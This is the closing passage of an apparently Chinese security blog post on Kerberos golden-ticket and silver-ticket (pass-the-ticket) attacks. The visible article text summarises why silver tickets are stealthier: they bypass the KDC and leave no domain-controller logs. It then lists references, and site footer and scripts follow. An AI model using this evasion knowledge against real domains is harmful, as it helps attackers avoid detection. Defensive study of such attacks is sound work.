+<div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">白银票据不经过 KDC，因此白银票据日志相对于黄金票据会更少，同时白银票据的日志都在目标服务器上，域控上不会有日志</span><br><span class="line">白银票据利用服务账户的哈希值，不同于黄金票据利用 krbtgt 账户的哈希值，因此白银票据更加隐蔽</span><br></pre></td></tr></table></figure></div>
+<hr>
+<h2 id="五、参考"><a href="#五、参考" class="headerlink" title="五、参考"></a>五、参考</h2><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://www.freebuf.com/articles/web/341103.html</span><br><span class="line">https://mp.weixin.qq.com/s/g-FEUXISYarj7ksYVxWCtg</span><br><span class="line">https://blog.csdn.net/zzgslh/article/details/106896431</span><br></pre></td></tr></table></figure></div>
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>加载评论需要在浏览器启用 JavaScript 脚本支持。</noscript>
+        </div>
+    </div>
+
+
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+         
+          <li><a href="/tags/">标签</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">一、前言</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Kerberos"><span class="toc-number">1.1.</span> <span class="toc-text">Kerberos</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%EF%BC%88Golden-Ticket%EF%BC%89%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB"><span class="toc-number">2.</span> <span class="toc-text">二、黄金票据（Golden Ticket）传递攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%B6%E4%BD%9C%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E6%9D%A1%E4%BB%B6"><span class="toc-number">2.1.</span> <span class="toc-text">制作黄金票据条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB%E5%AE%9E%E8%B7%B5"><span class="toc-number">2.2.</span> <span class="toc-text">黄金票据传递攻击实践</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE-Silver-Ticket-%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB"><span class="toc-number">3.</span> <span class="toc-text">三、白银票据(Silver Ticket)传递攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%B6%E4%BD%9C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE%E6%9D%A1%E4%BB%B6"><span class="toc-number">3.1.</span> <span class="toc-text">制作白银票据条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB%E5%AE%9E%E8%B7%B5"><span class="toc-number">3.2.</span> <span class="toc-text">白银票据传递攻击实践</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E6%80%BB%E7%BB%93"><span class="toc-number">4.</span> <span class="toc-text">四、总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%94%E3%80%81%E5%8F%82%E8%80%83"><span class="toc-number">5.</span> <span class="toc-text">五、参考</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2023/01/23/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%B3%BB%E5%88%97-%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92(Pass%20the%20Ticket)%E6%94%BB%E5%87%BB/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2023/01/23/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%B3%BB%E5%88%97-%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92(Pass%20the%20Ticket)%E6%94%BB%E5%87%BB/&text=域渗透系列-票据传递(Pass the Ticket)攻击"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2023/01/23/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%B3%BB%E5%88%97-%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92(Pass%20the%20Ticket)%E6%94%BB%E5%87%BB/&title=域渗透系列-票据传递(Pass the Ticket)攻击"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2023/01/23/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%B3%BB%E5%88%97-%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92(Pass%20the%20Ticket)%E6%94%BB%E5%87%BB/&is_video=false&description=域渗透系列-票据传递(Pass the Ticket)攻击"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=域渗透系列-票据传递(Pass the Ticket)攻击&body=Check out this article: http://example.com/2023/01/23/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%B3%BB%E5%88%97-%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92(Pass%20the%20Ticket)%E6%94%BB%E5%87%BB/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2023/01/23/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%B3%BB%E5%88%97-%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92(Pass%20the%20Ticket)%E6%94%BB%E5%87%BB/&title=域渗透系列-票据传递(Pass the Ticket)攻击"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2023/01/23/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%B3%BB%E5%88%97-%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92(Pass%20the%20Ticket)%E6%94%BB%E5%87%BB/&title=域渗透系列-票据传递(Pass the Ticket)攻击"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2023/01/23/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%B3%BB%E5%88%97-%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92(Pass%20the%20Ticket)%E6%94%BB%E5%87%BB/&title=域渗透系列-票据传递(Pass the Ticket)攻击"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2023/01/23/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%B3%BB%E5%88%97-%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92(Pass%20the%20Ticket)%E6%94%BB%E5%87%BB/&title=域渗透系列-票据传递(Pass the Ticket)攻击"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2023/01/23/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%B3%BB%E5%88%97-%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92(Pass%20the%20Ticket)%E6%94%BB%E5%87%BB/&name=域渗透系列-票据传递(Pass the Ticket)攻击&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2023/01/23/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%B3%BB%E5%88%97-%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92(Pass%20the%20Ticket)%E6%94%BB%E5%87%BB/&t=域渗透系列-票据传递(Pass the Ticket)攻击"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+      <div class="footer-left">
+        Copyright &copy;
+        
+        
+        2022-2025
+        Funsiooo
+      </div>
+      <div class="footer-right">
+        <nav>
+          <ul>
+            <!--
+          --><li><a href="/">首页</a></li><!--
+        --><!--
+          --><li><a href="/archives/">归档</a></li><!--
+        --><!--
+          --><li><a href="/search/">搜索</a></li><!--
+        --><!--
+          --><li><a href="/tags/">标签</a></li><!--
+        --><!--
+          --><li><a href="/about/">关于</a></li><!--
+        -->
+          </ul>
+        </nav>        
+      </div>
+
+      <div class="footer-midle">
+        <nav>
+          <ul>
+            
+              <!-- 不蒜子统计 -->
+              <span id="busuanzi_container_site_pv">
+                  本站总访问量<span id="busuanzi_value_site_pv"></span>次
+              </span>
+              <span class="post-meta-divider">|</span>
+              <span id="busuanzi_container_site_uv" style='display:none'>
+                      本站访客数<span id="busuanzi_value_site_uv"></span>人
+              </span>
+              <span id="busuanzi_container_page_pv">
+			  本文总阅读量<span id="busuanzi_value_page_pv"></span>次
+	      </span>
+            <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            
+          </ul>
+        </nav>
+      </div>
+</footer>
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+  <script type="text/javascript">
+        var _hmt = _hmt || [];
+        (function() {
+          var hm = document.createElement("script");
+          hm.src = "https://hm.baidu.com/hm.js?47a5bc2b41144f91553c5eefd4999c0d";
+          var s = document.getElementsByTagName("script")[0];
+          s.parentNode.insertBefore(hm, s);
+        })();
+        </script>
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'boom';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+<!-- utterances Comments -->
+
+<!-- FancyBox -->
+
+<script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@4.0/dist/fancybox.umd.js"></script>
+
+
+</body>
+</html>
